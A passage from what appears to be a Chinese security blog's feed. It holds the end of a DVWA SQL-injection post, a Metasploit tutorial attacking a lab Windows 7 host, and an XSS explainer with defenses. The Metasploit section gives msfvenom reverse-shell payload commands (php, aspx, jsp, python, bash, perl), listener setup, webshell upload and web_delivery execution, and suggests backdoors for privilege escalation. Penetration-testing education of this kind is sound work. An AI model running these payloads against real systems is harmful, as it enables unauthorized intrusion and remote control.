<h2 id="源代码：-3"><a href="#源代码：-3" class="headerlink" title="源代码："></a>源代码：</h2><p>代码最开始就使用了checkToken函数检查Anti-CSRF token，在用户每次查询时都会附带一个不一样的token参数，用于防范跨站点请求伪造，并且这次使用了查询语句预编译，这样就导致用户输入的内容仅作为一个变量，而非查询语句的一部分，从而可以预防SQL注入</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    <span class="title function_ invoke__">checkToken</span>( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Was a number entered?</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>( <span class="variable">$id</span> )) &#123;</span><br><span class="line">        <span class="variable">$id</span> = <span class="title function_ invoke__">intval</span> (<span class="variable">$id</span>);</span><br><span class="line">        <span class="keyword">switch</span> (<span class="variable">$_DVWA</span>[<span class="string">&#x27;SQLI_DB&#x27;</span>]) &#123;</span><br><span class="line">            <span class="keyword">case</span> MYSQL:</span><br><span class="line">                <span class="comment">// Check the database</span></span><br><span class="line">                <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>( <span class="string">&#x27;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&#x27;</span> );</span><br><span class="line">                <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">bindParam</span>( <span class="string">&#x27;:id&#x27;</span>, <span class="variable">$id</span>, PDO::<span class="variable constant_">PARAM_INT</span> );</span><br><span class="line">                <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">                <span class="variable">$row</span> = <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">fetch</span>();</span><br><span class="line"></span><br><span class="line">                <span class="comment">// Make sure only 1 result is returned</span></span><br><span class="line">                <span class="keyword">if</span>( <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">rowCount</span>() == <span class="number">1</span> ) &#123;</span><br><span class="line">                    <span class="comment">// Get values</span></span><br><span class="line">                    <span class="variable">$first</span> = <span class="variable">$row</span>[ <span class="string">&#x27;first_name&#x27;</span> ];</span><br><span class="line">                    <span class="variable">$last</span>  = <span class="variable">$row</span>[ <span class="string">&#x27;last_name&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// Feedback for end user</span></span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> SQLITE:</span><br><span class="line">                <span class="keyword">global</span> <span class="variable">$sqlite_db_connection</span>;</span><br><span class="line"></span><br><span class="line">                <span class="variable">$stmt</span> = <span class="variable">$sqlite_db_connection</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&#x27;SELECT first_name, last_name FROM users WHERE user_id = :id LIMIT 1;&#x27;</span> );</span><br><span class="line">                <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bindValue</span>(<span class="string">&#x27;:id&#x27;</span>,<span class="variable">$id</span>,SQLITE3_INTEGER);</span><br><span class="line">                <span class="variable">$result</span> = <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">                <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">finalize</span>();</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$result</span> !== <span class="literal">false</span>) &#123;</span><br><span class="line">                    <span class="comment">// There is no way to get the number of rows returned</span></span><br><span class="line">                    <span class="comment">// This checks the number of columns (not rows) just</span></span><br><span class="line">                    <span class="comment">// as a precaution, but it won&#x27;t stop someone dumping</span></span><br><span class="line">                    <span class="comment">// multiple rows and viewing them one at a time.</span></span><br><span class="line"></span><br><span class="line">                    <span class="variable">$num_columns</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">numColumns</span>();</span><br><span class="line">                    <span class="keyword">if</span> (<span class="variable">$num_columns</span> == <span class="number">2</span>) &#123;</span><br><span class="line">                        <span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetchArray</span>();</span><br><span class="line"></span><br><span class="line">                        <span class="comment">// Get values</span></span><br><span class="line">                        <span class="variable">$first</span> = <span class="variable">$row</span>[ <span class="string">&#x27;first_name&#x27;</span> ];</span><br><span class="line">                        <span class="variable">$last</span>  = <span class="variable">$row</span>[ <span class="string">&#x27;last_name&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">                        <span class="comment">// Feedback for end user</span></span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line"><span class="title function_ invoke__">generateSessionToken</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>DVWA</tag>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title>Metasploit渗透Windows实战</title>
    <url>/2023/07/21/Metasploit%E6%B8%97%E9%80%8FWindows%E5%AE%9E%E6%88%98/</url>
    <content><![CDATA[<blockquote>
<p>前言：关于什么是Metasploit以及怎么用Metasploit可以转到<a href="https://hybbwuxidixi.github.io/2023/04/01/%E5%88%9D%E5%A7%8BMetasploit/">Kali - 初识Metasploit | 岚曦 ‘ s Blog</a></p>
<p>测试环境：</p>
<ul>
<li><p>攻击机：Kali 2023.1</p>
<ul>
<li>IP : 192.168.237.129</li>
</ul>
</li>
<li><p>靶机：Windows 7 旗舰版 （内部版本7601）</p>
<ul>
<li>IP : 192.168.237.128</li>
</ul>
</li>
</ul>
</blockquote>
<h1 id="确定攻击目标，收集靶机数据"><a href="#确定攻击目标，收集靶机数据" class="headerlink" title="确定攻击目标，收集靶机数据"></a>确定攻击目标，收集靶机数据</h1><p>在任何攻击前，都需要明确此次攻击的目标以及目标的相关信息。通过信息收集可以获得目标的 <strong>IP 地址</strong>、<strong>开放端口</strong>、<strong>系统版本</strong>、<strong>开放服务</strong>等信息，做好攻击前的信息收集有助于后续的操作。</p>
<p>此次攻击的前提是已知靶机 IP 地址为192.168.237.128，可以使用 Nmap 等工具对靶机的其他信息进行收集。</p>
<p>Metasploit 内自带 Nmap，使用指令：<code>db_nmap -sV -T4 192.168.237.128</code> 扫描靶机，返回结果如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/pic/202307211642509.png"></p>
<p>可以看到开放的端口有135、139、445以及 RPC 服务的端口，主机名为 WIN-4JCVTB0CI4S，操作系统为 Windows。在目标主机具体IP不明确的情况下可以使用 <code>db_nmap -sP 192.168.237.0/24</code> 对整个网段进行扫描，返回网段内存活的所有主机 IP。</p>
<p><img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/pic/202307211649957.png"></p>
<p>使用参数-sV的情况下，此次扫描整体耗时1分钟，相对来说比较慢。这时可以在获取存活主机 IP后再使用 <code>db_nmap -sS -T4 192.168.237.128</code> 对目标主机的端口进行半开放扫描以加快扫描速度。</p>
<blockquote>
<p>Nmap 常用参数及解释：</p>
<p>nmap -sU -p 扫描指定的UDP端口 也可以去掉-P 对主机进行UDP端口扫描</p>
<p>nmap -sT -p 扫描指定的UDP端口 也可以去掉-P 对主机进行TCP端口扫描</p>
<p>nmap -sP 侦测在线主机、扫描MAC</p>
<p>nmap -sL &lt;ip&#x2F;CIDR地址块&gt; 检测网络内所有主机名称，不对主机端口进行侦测</p>
<p>nmap –sS 使用SYN扫描（-sS），该选项也称为“半开连接”或者“SYN stealth”。nmap发送syn包后等待回应，如果接收SYS&#x2F;ACK包说明端口开放，如果收到RST包，说明端口关闭；如果没有回应或者回应icmp不可达错误消息，则说明端口被过滤</p>
<p>nmap -O 探测目标主机操作系统版本</p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/pic/202307211654065.png"></p>
<p>获取到目标的 IP , OS , PORT , SERVICE 后就可以开始渗透。</p>
<h1 id="搜索端口漏洞，开启本地监听"><a href="#搜索端口漏洞，开启本地监听" class="headerlink" title="搜索端口漏洞，开启本地监听"></a>搜索端口漏洞，开启本地监听</h1><p>通过根据上个阶段获取的开放端口搜索端口存在的漏洞，使用 <code>search</code> 指令进行搜索，用法如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/pic/202307211703097.png"></p>
<p>假设攻击445端口，445端口最著名的漏洞即“永恒之蓝”漏洞 MS17_010，使用 <code>search ms17_010</code> 即可。</p>
<p><img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/pic/202307211709286.png"></p>
<p>可以看到有多个模块可供使用，包括 exploit（攻击模块），auxiliary（辅助模块）等。对于如何攻击445端口可见：<a href="https://hybbwuxidixi.github.io/2023/04/01/%E5%88%9D%E5%A7%8BMetasploit/">Kali - 初识Metasploit | 岚曦 ‘ s Blog</a>，本文进行的攻击针对目标主机的80端口Web服务（目标主机需开启Web服务，端口不一定为80，视情况而定）。</p>
<p>使用msfvenom创建载荷（payload）</p>
<blockquote>
<p>常见参数：</p>
<p>-l, –list <type> 列出指定模块的所有可用资源. 模块类型包括: payloads, encoders, nops,……all</type></p>
<p>-p, –payload &lt; payload&gt; 指定需要使用的payload(攻击荷载)。也可以使用自定义payload,几乎是支持全平台的</p>
<p>-f, –format &lt; format&gt; 指定输出格式</p>
<p>-e, –encoder <encoder> 指定需要使用的encoder（编码器），指定需要使用的编码，如果既没用-e选项也没用-b选项，则输出raw payload</encoder></p>
<p>-a, –arch &lt; architecture&gt; 指定payload的目标架构，例如x86 还是 x64 还是 x86_64</p>
<p>-o, –out &lt; path&gt; 指定创建好的payload的存放位置</p>
<p>-b, –bad-chars &lt; list&gt; 设定规避字符集，指定需要过滤的坏字符。例如：不使用 ‘\x0f’、’\x00’</p>
<p>-n, –nopsled &lt; length&gt; 为payload预先指定一个NOP滑动长度</p>
<p>-s, –space &lt; length&gt; 设定有效攻击荷载的最大长度，就是文件大小</p>
<p>-i, –iterations &lt; count&gt; 指定payload的编码次数</p>
<p>-c, –add-code &lt; path&gt; 指定一个附加的win32 shellcode文件</p>
<p>-x, –template &lt; path&gt; 指定一个自定义的可执行文件作为模板,并将payload嵌入其中</p>
<p>-k, –keep 保护模板程序的动作，注入的payload作为一个新的进程运行</p>
<p>-v, –var-name &lt; value&gt; 指定一个自定义的变量，以确定输出格式</p>
<p>-t, –timeout <second> 从stdin读取有效负载时等待的秒数（默认为30，0表示禁用）</second></p>
<p>-h,–help 查看帮助选项</p>
<p>–platform &lt; platform&gt; 指定payload的目标平台</p>
</blockquote>
<p>例如输入命令 <code>msfvenom -l payloads -a x64 | grep windows</code> 先看下64位windows payload ：</p>
<p><img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/pic/202307211736547.png"></p>
<p>选择 windows&#x2F;meterpreter&#x2F;reverse_tcp 作为payload（在 msf 中还包含 bind_tcp、reverse_http、bind_tcp，区别如下）</p>
<blockquote>
<p>Tips：</p>
<p>reverse_tcp：攻击机设置一个端口（LPORT）和IP（LHOST），Payload在测试机执行连接攻击机IP的端口，这时如果在攻击机监听该端口会发现测试机已经连接。</p>
<p>bind_tcp：攻击机设置一个端口（LPORT），Payload在测试机执行打开该端口，以便攻击机可以接入。</p>
<p>采用reverse的方法一般较为安全，因为是在测试机连接攻击机，所以一般不会被防火墙发现；而bind在测试机打开端口时很容易被安全软件和防火墙发现。</p>
</blockquote>
<p>在生成攻击 payload 之前需要攻击机打开监听器以监听目标主机的上线。使用如下指令：</p>
<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="keyword">set</span> payload <span class="comment">windows</span>/meterpreter/<span class="comment">reverse_tcp</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">lhost</span> 监听<span class="comment">ip</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">lport</span> 监听端口</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>在执行完 <code>set payload windows/meterpreter/reverse_tcp</code> 后可使用 show options 查看监听器 payload 所需设置的选项，可以看到现在需要设置 LHOST（监听机本地IP），LPORT 也可以设置成其他端口。</p>
<p><img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/pic/202307211823916.png"></p>
<p>设置完成后可以发现已经开始监听（如果下文中的攻击 payload 和监听 payload 不一致，需修改监听 payload 再运行！！）。</p>
<p><img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/pic/202307211826578.png"></p>
<h1 id="确定攻击方式，执行攻击载荷"><a href="#确定攻击方式，执行攻击载荷" class="headerlink" title="确定攻击方式，执行攻击载荷"></a>确定攻击方式，执行攻击载荷</h1><h2 id="上传木马文件方式"><a href="#上传木马文件方式" class="headerlink" title="上传木马文件方式"></a>上传木马文件方式</h2><h3 id="Web-Payload"><a href="#Web-Payload" class="headerlink" title="Web Payload"></a>Web Payload</h3><p>假设目标主机的WEB服务存在一个文件上传漏洞，可以通过这个漏洞上传木马文件，只要能访问到上传的木马文件就可以拿到 session。此时可以创建Web payload，通过生成web文件再上传到目标主机的方式获取 session。</p>
<p>Web payload有多种生成方式，包括：</p>
<ul>
<li>php</li>
</ul>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">msfvenom -p php/meterpreter_reverse_tcp <span class="attribute">lhost</span>=监听ip <span class="attribute">lport</span>=监听端口 -f<span class="built_in"> raw </span>-o /root/desktop/shell.php</span><br></pre></td></tr></table></figure>

<ul>
<li>aspx</li>
</ul>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp <span class="attribute">LHOST</span>=监听ip <span class="attribute">LPORT</span>=监听端口 -f aspx -o shell.aspx</span><br></pre></td></tr></table></figure>

<ul>
<li>jsp</li>
</ul>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp <span class="attribute">LHOST</span>=监听ip <span class="attribute">LPORT</span>=监听端口 -f<span class="built_in"> raw </span>&gt; shell.jsp</span><br></pre></td></tr></table></figure>

<ul>
<li>war</li>
</ul>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp <span class="attribute">LHOST</span>=监听ip <span class="attribute">LPORT</span>=监听端口 -f war &gt; shell.war</span><br></pre></td></tr></table></figure>

<p>以 php 为例，在攻击机输入对应指令后会生成一个 shell.php，参数 -f raw 表示生成未经处理的格式，-o 表示指定输出路径，注意指令中的 lhost 和 lport 必须和监听器中的 lhost，lport 一致：</p>
<p><img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/pic/202307211851982.png"></p>
<p><strong>扩展：meterpreter_reverse_tcp（stageless） 与 mererpreter&#x2F;reverse_tcp（stage） 的区别</strong></p>
<p>在 msf 中存在这两种 payload，写法上区别为 “__” 与 “&#x2F;” ，实际上这两者的区别为 meterpreter_reverse_tcp 包含攻击所需的所有内容，相当于“大马”，容易被发现和拦截，而 mererpreter&#x2F;reverse_tcp 只为了攻击机和目标主机之间建立连接，后续的攻击动作会传递给 reverse_tcp 进行。</p>
<p>在创建完 php 文件后，攻击机访问目标主机站点，通过存在文件上传漏洞的页面将 php 文件上传上去：</p>
<p><img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/pic/202307211903843.png"></p>
<p>检查目标主机的目录，shell.php 已经被上传上去了，攻击机只要访问到这个文件即可完成session 的建立（这里攻击 payload 为 php&#x2F;meterpreter_reverse_tcp，需修改监听payload为相同 payload）。</p>
<p><img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/pic/202307211914973.png"></p>
<p>可以看到已经进入了 meterpreter 后渗透模块，输入？查看可以执行的操作：</p>
<p><img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/pic/202307211916710.png"></p>
<h3 id="Scripts-Payload"><a href="#Scripts-Payload" class="headerlink" title="Scripts Payload"></a>Scripts Payload</h3><p>除了 web 文件以外还可以生成脚本文件，包括 python、bash、perl 等。用法和web文件相似：</p>
<ul>
<li>python</li>
</ul>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">msfvenom -p python/meterpreter/reverse_tcp <span class="attribute">LHOST</span>=监听ip <span class="attribute">LPORT</span>=监听端口 -f<span class="built_in"> raw </span>&gt; shell.py</span><br></pre></td></tr></table></figure>

<ul>
<li>bash</li>
</ul>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_bash <span class="attribute">LHOST</span>=监听ip <span class="attribute">LPORT</span>=监听端口 -f<span class="built_in"> raw </span>&gt; shell.sh</span><br></pre></td></tr></table></figure>

<ul>
<li>perl</li>
</ul>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_perl LHOST= <span class="attribute">LPORT</span>=监听端口 -f<span class="built_in"> raw </span>&gt; shell.pl</span><br></pre></td></tr></table></figure>

<p>这里就不做展示了，只要目标主机执行到这些脚本即可建立 session。</p>
<h2 id="不上传木马文件方式"><a href="#不上传木马文件方式" class="headerlink" title="不上传木马文件方式"></a>不上传木马文件方式</h2><p>上传木马的方法有很大的局限性，首先需要通过漏洞将文件上传到目标主机，还需要目标主机执行，而不上传文件的方式则更好操作，这里运用到 web_delivery 模块，需要目标主机存在远程执行命令漏洞，这个模块不需要依赖文件，而是直接执行在目标主机的内存中，不易被发现。</p>
<p>使用 msfvenom 生成 web_delivery 远程执行代码：</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">use exploit/multi/script/web_delivery</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> uripath /</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> payload php/meterpreter/reverse_tcp</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> target 1</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> lhost xxx</span><br><span class="line"></span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>在 set target 时可以使用 show targets 查看可用的 target ，target 需和 payload 类型一致，不需要运行监听器。</p>
<p><img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/pic/202307211935394.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/pic/202307211936590.png"></p>
<p>在有远程代码执行的主机上执行这段代码即可建立 session。注意：若目标主机未配置 php 的环境变量则无法执行这段代码，可以尝试其他 payload。</p>
<p>以 python payload 为例，假设目标主机的网站存在远程代码执行漏洞，将生成的代码进行执行。</p>
<p><img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/pic/202307211941222.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/pic/202307211942037.png"></p>
<p>可以看到已经建立 session 了，依然使用 meterpreter 进行后渗透操作，包括查看各种信息（uid、pid、sysinfo 等）、执行系统指令（cd、ls、upload、shutdown 等）和其他操作。</p>
<p><img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/pic/202307211950757.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/pic/202307211950584.png"></p>
<h1 id="后话"><a href="#后话" class="headerlink" title="后话"></a>后话</h1><p>由于本文都是基于 webshell，权限较低，如果想要获得更高的权限做更多的事，可以通过webshell植入后门，再通过后门提权。</p>
]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>metasploit</tag>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>XSS详解</title>
    <url>/2023/07/13/XSS%E8%AF%A6%E8%A7%A3/</url>
    <content><![CDATA[<h1 id="XSS-Cross-Site-Scripting"><a href="#XSS-Cross-Site-Scripting" class="headerlink" title="XSS - Cross Site Scripting"></a>XSS - Cross Site Scripting</h1><p>跨站脚本攻击（Cross-site scripting，XSS）是一种安全漏洞，攻击者可以利用这种漏洞在网站上注入恶意的客户端代码。当目标网站目标用户浏览器渲染HTML文档的过程中，出现了不被预期的脚本指令并执行时，XSS就发生了。</p>
<p>作为一种HTML注入攻击，XSS攻击的核心思想就是在HTML页面中注入恶意代码，而XSS采用的注入方式是非常巧妙的。在XSS攻击中，一般有三个角色参与：攻击者、目标服务器、受害者的浏览器。</p>
<p>由于有的服务器并没有对用户的输入进行安全方面的验证，攻击者就可以很容易地通过正常的输入手段，夹带进一些恶意的HTML脚本代码。当受害者的浏览器访 问目标服务器上被注入恶意脚本的页面后，由于它对目标服务器的信任，这段恶意脚本的执行不会受到什么阻碍。而此时，攻击者的目的就已经达到了。</p>
<p>若受害者运行这些恶意代码，攻击者就可以突破网站的访问限制并冒充受害者。根据开放式 Web 应用安全项目（OWASP），XSS 在 2017 年被认为 <a href="https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A7-Cross-Site_Scripting_(XSS)">7 种最常见的 Web 应用程序漏洞之一</a>。</p>
<h1 id="XSS原理"><a href="#XSS原理" class="headerlink" title="XSS原理"></a>XSS原理</h1><p>XSS的原理是恶意攻击者往 Web 页面里插入恶意可执行网页脚本代码，当用户浏览该页之时，嵌入其中 Web 里面的脚本代码会被执行，从而可以达到攻击者盗取用户信息或其他侵犯用户安全隐私的目的。</p>
<h1 id="XSS攻击类型"><a href="#XSS攻击类型" class="headerlink" title="XSS攻击类型"></a><strong>XSS攻击类型</strong></h1><p>根据XSS脚本注入方式的不同，我们可以将XSS攻击简单的分类为反射型XSS、存储型XSS、DOM-based 型。</p>
<h2 id="反射型XSS（非持久型XSS）"><a href="#反射型XSS（非持久型XSS）" class="headerlink" title="反射型XSS（非持久型XSS）"></a>反射型XSS（非持久型XSS）</h2><p>又称<strong>非持久型XSS</strong>。之所以称为反射型XSS，是因为这种攻击方式的注入代码是从目标服务器通过错误信息、搜索结果等等方式“反射”回来的：发出请求时，XSS代码出现在URL中，作为输入提交到服务器端，服务器端解析后响应，XSS代码随响应内容一起传回给浏览器，最后浏览器解析执行XSS代码。这个过程像一次反射，故叫反射型XSS。 而称为非持久型XSS，则是因为这种攻击方式具有一次性，由于代码注入的是一个动态产生的页面而不是永久的页面，因此这种攻击方式只在点击链接的时候才产生作用。</p>
<p>攻击者通过电子邮件等方式给别人发送带有恶意脚本代码参数的 URL，当 URL 地址被打开时，注入脚本被传输到目标服务器上，然后服务器将注入脚本“反射”到受害者的浏览器上，特有的恶意代码参数被 HTML 解析、执行。</p>
<p>非持久型 XSS 漏洞攻击的<strong>四大特点</strong>：① 即时性。不经过服务器存储，直接通过 HTTP 的 GET 和 POST 请求就能完成一次攻击，拿到用户隐私数据；②攻击者需要诱骗点击；③反馈率低，所以较难发现和响应修复；④盗取用户敏感保密信息。</p>
<p>防止出现非持久型 XSS 漏洞的<strong>五大措施</strong>：① Web 页面渲染的所有内容或者渲染的数据都必须来自于服务端；②尽量不要从 URL，document.referrer，document.forms 等这种 DOM API 中获取数据直接渲染；③尽量不要使用 eval, new Function()，document.write()，document.writeln()，window.setInterval()，window.setTimeout()，innerHTML，document.creteElement() 等可执行字符串的方法；④如果做不到以上几点，也必须对涉及 DOM 渲染的方法传入的字符串参数做 escape 转义；⑤ 前端渲染的时候对任何的字段都需要做 escape 转义编码。</p>
<h2 id="存储型XSS（持久型XSS）"><a href="#存储型XSS（持久型XSS）" class="headerlink" title="存储型XSS（持久型XSS）"></a><strong>存储型XSS（持久型XSS）</strong></h2><p>存储型XSS，又称持久型XSS，他和反射型XSS最大的不同就是，攻击脚本将被永久地存放在目标服务器端（数据库，内存，文件系统等），下次请求目标页面时不用再提交XSS代码。</p>
<p>一般存在于 Form 表单提交等交互功能，如发帖留言，提交文本信息等，黑客利用的 XSS 漏洞，将内容经正常功能提交进入数据库持久保存，当前端页面获得后端从数据库中读出的注入代码时，恰好将其渲染执行。</p>
<p>这种攻击多见于论坛，攻击者在发帖的过程中，将恶意脚本连同正常信息一起注入到帖子的内容之中。随着帖子被论坛服务器存储下来，恶意脚本也永久地被存放在论坛服务器的后端存储器中。当其它用户浏览这个被注入了恶意脚本的帖子的时候，恶意脚本则会在他们的浏览器中得到执行，从而受到了攻击。</p>
<p>可以看到，存储型XSS的攻击方式能够将恶意代码永久地嵌入一个页面当中，所有访问这个页面的用户都将成为受害者。如果我们能够谨慎对待不明链接，那么反射型的XSS攻击将没有多大作为，而存储型XSS则不同，由于它注入的往往是一些我们所信任的页面，因此无论我们多么小心，都难免会受到攻击。可以说，存储型XSS更具有隐蔽性，带来的危害也更大，除非服务器能完全阻止注入，否则任何人都很有可能受到攻击。</p>
<p>持久型 XSS 的三<strong>大特点</strong>：①持久性，植入在数据库中；②危害面广，甚至可以让用户机器变成 DDoS 攻击的肉鸡；③ 盗取用户敏感私密信息。</p>
<p>防止持久型 XSS 漏洞的三大措施：①后端在入库前应该选择不相信任何前端数据，将所有的字段统一进行转义处理；②后端在输出给前端数据统一进行转义处理；③前端在渲染页面 DOM 的时候应该选择不相信任何后端数据，任何字段都需要做转义处理。</p>
<h2 id="DOM-based-型"><a href="#DOM-based-型" class="headerlink" title="DOM-based 型"></a><strong>DOM-based 型</strong></h2><p>客户端的脚本程序可以动态地检查和修改页面内容，而不依赖于服务器端的数据。例如客户端如从 URL 中提取数据并在本地执行，如果用户在客户端输入的数据包含了恶意的 JavaScript 脚本，而这些脚本没有经过适当的过滤和消毒，那么应用程序就可能受到 DOM-based XSS 攻击。需要特别注意以下的用户输入源 document.URL、 location.hash、 location.search、 document.referrer 等。</p>
<h1 id="XSS的危害"><a href="#XSS的危害" class="headerlink" title="XSS的危害"></a>XSS的危害</h1><p>(1)<a href="https://www.zhihu.com/search?q=%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22article%22,%22sourceId%22:%22351593982%22%7D">网络钓鱼</a>，包括盗取各类用户账号；</p>
<p>(2)窃取用户cookies资料，从而获取用户隐私信息，或利用用户身份进一步对网站执行操作；</p>
<p>(3)劫持用户(浏览器)会话，从而执行任意操作，例如进行非法转账、强制发表日志、发送电子邮件等；</p>
<p>(4)强制弹出广告页面、刷流量等；</p>
<p>(5)<a href="https://www.zhihu.com/search?q=%E7%BD%91%E9%A1%B5%E6%8C%82%E9%A9%AC&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22article%22,%22sourceId%22:%22351593982%22%7D">网页挂马</a>，进行恶意操作，例如任意篡改页面信息、删除文章等；</p>
<p>(6)进行大量的客户端攻击，如DDoS攻击；</p>
<p>(7)获取客户端信息，例如用户的浏览历史、真实IP、开放端口等；</p>
<p>(8)控制受害者机器向其他网站发起攻击；</p>
<p>(9)结合其他漏洞，如<a href="https://www.zhihu.com/search?q=CSRF%E6%BC%8F%E6%B4%9E&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22article%22,%22sourceId%22:%22351593982%22%7D">CSRF漏洞</a>，实施进一步作恶；</p>
<p>(10)提升用户权限，包括进一步渗透网站；</p>
<p>(11) 传播<a href="https://www.zhihu.com/search?q=%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E8%A0%95%E8%99%AB&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22article%22,%22sourceId%22:%22351593982%22%7D">跨站脚本蠕虫</a>等；</p>
<h1 id="XSS防御"><a href="#XSS防御" class="headerlink" title="XSS防御"></a>XSS防御</h1><h2 id="对输入和URL参数进行过滤-白名单和黑名单"><a href="#对输入和URL参数进行过滤-白名单和黑名单" class="headerlink" title="对输入和URL参数进行过滤(白名单和黑名单)"></a>对输入和URL参数进行过滤(白名单和黑名单)</h2><p>检查用户输入的数据中是否包含一些特殊字符，如&lt;、&gt;、’、“等，发现存在特殊字符，将这些特殊字符过滤或者编码。</p>
